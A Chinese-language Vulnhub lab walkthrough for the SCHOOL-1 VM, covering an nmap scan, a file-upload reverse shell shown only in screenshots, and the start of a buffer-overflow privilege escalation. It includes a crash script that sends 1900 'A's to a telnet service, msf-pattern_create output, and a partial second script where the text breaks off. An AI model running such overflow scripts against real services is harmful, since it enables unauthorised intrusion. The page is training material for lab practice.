@@ -1,0 +1,691 @@
+<!doctype html><html><head><title>Vulnhub 613 SCHOOL-1</title><meta charset=utf-8><meta name=X-UA-Compatible content="IE=edge"><meta name=google-site-verification content><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" name=viewport><meta content="telephone=no" name=format-detection><meta name=description content><meta name=renderer content="webkit"><meta name=theme-color content="#ffffff"><script type=text/javascript>(function(e,t,n,s,o,i,a){e[n]=e[n]||function(){(e[n].q=e[n].q||[]).push(arguments)},i=t.createElement(s),i.async=1,i.src="https://www.clarity.ms/tag/"+o,a=t.getElementsByTagName(s)[0],a.parentNode.insertBefore(i,a)})(window,document,"clarity","script","abcdefghzd")</script><script src=/js/toc.js></script>
+<link type=text/css rel=stylesheet href=/vendor/css/bootstrap.min.css><link rel=stylesheet href=/scss/dark-mode.scss integrity media=screen><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Material+Icons"><script>console.log("Hello from 'layouts/partials/extended_head.html'")</script></head><body><div id=app><div class=single-column-drawer-container id=drawer v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }"><div class=drawer-content><div class=drawer-menu><a class="a-block drawer-menu-item active" href=/walkthrough>Walkthroughs</a>
+<a class="a-block drawer-menu-item false" href=/posts>Archive</a>
+<a class="a-block drawer-menu-item false" href=/categories>Categories</a>
+<a class="a-block drawer-menu-item false" href=/tags>Tags</a>
+<a class="a-block drawer-menu-item false" href=/index.xml>RSS Feed</a><div class=toc><div class=toc-content><center>- 目录 -</center><ul><ul><li><a href=#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae class=nav-环境配置>环境配置</a></li><li><a href=#%e5%88%9d%e6%ad%a5%e6%89%93%e7%82%b9 class=nav-初步打点>初步打点</a></li><ul><li><a href=#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f class=nav-端口扫描>端口扫描</a></li><li><a href=#web%e6%b5%8b%e8%af%95 class=nav-web测试>web测试</a></li><ul><li><a href=#%e7%ab%af%e5%8f%a380 class=nav-端口80>端口80</a></li></ul><li><a href=#%e6%bc%8f%e6%b4%9e%e5%8f%91%e7%8e%b0 class=nav-漏洞发现>漏洞发现</a></li></ul><li><a href=#%e8%8e%b7%e5%be%97%e6%9d%83%e9%99%90 class=nav-获得权限>获得权限</a></li><li><a href=#%e6%8f%90%e6%9d%83 class=nav-提权>提权</a></li><ul><li><a href=#poc1py class=nav-poc1py>poc1.py</a></li><li><a href=#poc2py class=nav-poc2py>poc2.py</a></li><li><a href=#poc3py class=nav-poc3py>poc3.py</a></li><li><a href=#poc4py class=nav-poc4py>poc4.py</a></li><li><a href=#poc5py class=nav-poc5py>poc5.py</a></li><li><a href=#poc6py class=nav-poc6py>poc6.py</a></li><li><a href=#poc7py class=nav-poc7py>poc7.py</a></li></ul></div></div></div></div></div><transition name=fade><div id=drawer-mask v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if=isDrawerOpen v-on:click=toggleDrawer></div></transition><nav id=navBar class="navbar sticky-top navbar-light single-column-nav-container"><div id=navBackground class=nav-background></div><div class="container container-narrow nav-content"><button id=nav_dropdown_btn class=nav-dropdown-toggle type=button v-on:click=toggleDrawer>
+<i class=material-icons>menu</i></button>
+<a id=navTitle class=navbar-brand href=https://www.vulnhub.cn>Vulnhub靶机教程</a>
+<button type=button class=nav-darkmode-toggle id=darkModeToggleButton2>
+<i class=material-icons id=darkModeToggleIcon2>dark_mode</i></button></div></nav><div class=single-column-header-container id=pageHead v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }"><a href=https://www.vulnhub.cn><div class=single-column-header-title>Vulnhub靶机教程</div><div class=single-column-header-subtitle>Themed by Diary.</div></a></div><div id=content><div id=streamContainer class=stream-container><div class="post-list-container post-list-container-shadow"><div class=post><div class=post-head-wrapper-text-only><div class=post-title>Vulnhub 613 SCHOOL-1<div class=post-meta><time itemprop=datePublished>2020-12-04 00:00</time></div></div></div><div class=post-body-wrapper><div class=post-body v-pre><p>考点：网页注释,文件上传,缓冲区溢出</p><p>靶机链接：<a href=https://www.vulnhub.com/entry/school-1,613/>https://www.vulnhub.com/entry/school-1,613/</a></p><h2 id=环境配置>环境配置</h2><table><thead><tr><th>名称</th><th>IP</th></tr></thead><tbody><tr><td>Kali Linux</td><td>10.0.2.15</td></tr><tr><td>SCHOOL-1</td><td>10.0.2.110</td></tr><tr><td>Windows7X86</td><td>10.0.2.14</td></tr></tbody></table><h2 id=初步打点>初步打点</h2><h3 id=端口扫描>端口扫描</h3><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ <span style=color:#658b00>export</span> <span style=color:#00688b>rip</span>=10.0.2.110
+</span></span><span style=display:flex><span>$ sudo nmap -v -A -p- <span style=color:#00688b>$rip</span>
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>2048</span> de:b5:23:89:bb:9f:d4:1a:b5:04:53:d0:b7:5c:b0:3f (RSA)
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>256</span> 16:09:14:ea:b9:fa:17:e9:45:39:5e:3b:b4:fd:11:0a (ECDSA)
+</span></span><span style=display:flex><span>|_  <span style=color:#b452cd>256</span> 9f:66:5e:71:b9:12:5d:ed:70:5a:4f:5a:8d:0d:65:d5 (ED25519)
+</span></span><span style=display:flex><span>23/tcp open  telnet?
+</span></span><span style=display:flex><span>| fingerprint-strings: 
+</span></span><span style=display:flex><span>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, ms-sql-s, oracle-tns, tn3270: 
+</span></span><span style=display:flex><span>|_    Verification Code:
+</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+</span></span><span style=display:flex><span>| http-methods: 
+</span></span><span style=display:flex><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.38 (Debian)
+</span></span><span style=display:flex><span><span style=color:#b452cd>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style=display:flex><span>SF-Port23-TCP:V=7.92%I=7%D=8/30%Time=630DADD0%P=x86_64-pc-linux-gnu%r(NULL
+</span></span><span style=display:flex><span>SF:,1C,<span style=color:#cd5555>&#34;Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(GenericLines,
+</span></span><span style=display:flex><span>SF:1C,<span style=color:#cd5555>&#34;Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(tn3270,1C,<span style=color:#cd5555>&#34;Ver
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:ification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(GetRequest,1C,<span style=color:#cd5555>&#34;Verifi
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:cation\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(HTTPOptions,1C,<span style=color:#cd5555>&#34;Verifica
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:tion\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(RTSPRequest,1C,<span style=color:#cd5555>&#34;Verificati
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:on\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(RPCCheck,1C,<span style=color:#cd5555>&#34;Verification\x2
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:0Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(DNSVersionBindReqTCP,1C,<span style=color:#cd5555>&#34;Verifica
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:tion\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(DNSStatusRequestTCP,1C,<span style=color:#cd5555>&#34;Ve
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:rification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(Help,1C,<span style=color:#cd5555>&#34;Verificatio
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:n\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(SSLSessionReq,1C,<span style=color:#cd5555>&#34;Verificatio
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:n\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(TerminalServerCookie,1C,<span style=color:#cd5555>&#34;Veri
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:fication\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(TLSSessionReq,1C,<span style=color:#cd5555>&#34;Veri
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:fication\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(Kerberos,1C,<span style=color:#cd5555>&#34;Verificat
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:ion\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(SMBProgNeg,1C,<span style=color:#cd5555>&#34;Verification
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(X11Probe,1C,<span style=color:#cd5555>&#34;Verification\x20C
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:ode:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(FourOhFourRequest,1C,<span style=color:#cd5555>&#34;Verification\
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(LPDString,1C,<span style=color:#cd5555>&#34;Verification\x20C
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:ode:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(LDAPSearchReq,1C,<span style=color:#cd5555>&#34;Verification\x20C
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:ode:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(LDAPBindReq,1C,<span style=color:#cd5555>&#34;Verification\x20Cod
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:e:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(SIPOptions,1C,<span style=color:#cd5555>&#34;Verification\x20Code:\
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(LANDesk-RC,1C,<span style=color:#cd5555>&#34;Verification\x20Code:\n\0
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(TerminalServer,1C,<span style=color:#cd5555>&#34;Verification\x20Code:\n\
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(NCP,1C,<span style=color:#cd5555>&#34;Verification\x20Code:\n\0\0\0\xee\
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:x1e@\0\xe2\x1c&#34;</span>)%r(NotesRPC,1C,<span style=color:#cd5555>&#34;Verification\x20Code:\n\0\0\0\xee\x1e@\
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:0\xe2\x1c&#34;</span>)%r(JavaRMI,1C,<span style=color:#cd5555>&#34;Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:x1c&#34;</span>)%r(WMSRequest,1C,<span style=color:#cd5555>&#34;Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>SF:&#34;</span>)%r(oracle-tns,1C,<span style=color:#cd5555>&#34;Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%
+</span></span><span style=display:flex><span>SF:r(ms-sql-s,1C,<span style=color:#cd5555>&#34;Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>)%r(afp
+</span></span><span style=display:flex><span>SF:,1C,<span style=color:#cd5555>&#34;Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c&#34;</span>);
+</span></span></code></pre></td></tr></table></div></div><h3 id=web测试>web测试</h3><h4 id=端口80>端口80</h4><p>dirb获得<code>http://10.0.2.110/student_attendance/database</code>访问后获得用户名密码hash，丢cmd5完事</p><p><img src=https://www.vulnhub.cn/walkthrough/613/1.webp alt=1></p><p>查看源代码发现隐藏链接</p><p><img src=https://www.vulnhub.cn/walkthrough/613/2.webp alt=2></p><h3 id=漏洞发现>漏洞发现</h3><p>访问发现文件上传</p><p><img src=https://www.vulnhub.cn/walkthrough/613/3.webp alt=3></p><p>上传php反弹shell</p><p><img src=https://www.vulnhub.cn/walkthrough/613/4.webp alt=4></p><h2 id=获得权限>获得权限</h2><p>成功接收反弹shell，查看root权限启动的进程发现<code>win</code></p><p><img src=https://www.vulnhub.cn/walkthrough/613/5.webp alt=5></p><p>上antsword下载/root/win 打开一看下了个寂寞</p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat win                                        
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>while</span> <span style=color:#658b00>true</span>
+</span></span><span style=display:flex><span> <span style=color:#8b008b;font-weight:700>do</span>
+</span></span><span style=display:flex><span>  wine /opt/access/access.exe
+</span></span><span style=display:flex><span>  sleep <span style=color:#b452cd>3</span>
+</span></span><span style=display:flex><span> <span style=color:#8b008b;font-weight:700>done</span>
+</span></span></code></pre></td></tr></table></div></div><p>看来关键文件是<code>/opt/access/access.exe</code></p><p><img src=https://www.vulnhub.cn/walkthrough/613/6.webp alt=6></p><h2 id=提权>提权</h2><p>只要溢出这个程序就可以获得root权限</p><h3 id=poc1py>poc1.py</h3><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#1e889b>#!/usr/bin/python2
+</span></span></span><span style=display:flex><span><span style=color:#1e889b></span>import socket
+</span></span><span style=display:flex><span>import sys
+</span></span><span style=display:flex><span>import os
+</span></span><span style=display:flex><span><span style=color:#00688b>ip</span> = <span style=color:#cd5555>&#34;10.0.2.14&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>port</span> = <span style=color:#b452cd>23</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>buff</span> = <span style=color:#cd5555>&#34;A&#34;</span> * <span style=color:#b452cd>1900</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>nullByte</span> = <span style=color:#cd5555>&#34;\x00&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>inputBuffer</span> =  buff 
+</span></span><span style=display:flex><span><span style=color:#00688b>s</span> = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span style=display:flex><span>s.connect((ip, port))
+</span></span><span style=display:flex><span>s.send(inputBuffer)
+</span></span><span style=display:flex><span>s.close()
+</span></span></code></pre></td></tr></table></div></div><h3 id=poc2py>poc2.py</h3><p>先上msf-pattern_create</p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ msf-pattern_create -l <span style=color:#b452cd>200</span>   
+</span></span><span style=display:flex><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+</span></span></code></pre></td></tr></table></div></div><p>这里直接用msf-pattern_create生成2000，未能溢出成功，</p><p>当<code>buff = 'A'*1700</code>时，Immunity Debugger获得的eip找不到。</p><p>改成1800个A拼接溢出成功。</p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#1e889b>#!/usr/bin/python2
+</span></span></span><span style=display:flex><span><span style=color:#1e889b></span>import socket
+</span></span><span style=display:flex><span>import sys
+</span></span><span style=display:flex><span>import os
+</span></span><span style=display:flex><span>from <span style=color:#658b00>time</span> import sleep
+</span></span><span style=display:flex><span><span style=color:#00688b>ip</span> = <span style=color:#cd5555>&#34;10.0.2.14&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>port</span> = <span style=color:#b452cd>23</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>buff</span> = <span style=color:#cd5555>&#39;A&#39;</span>*1800
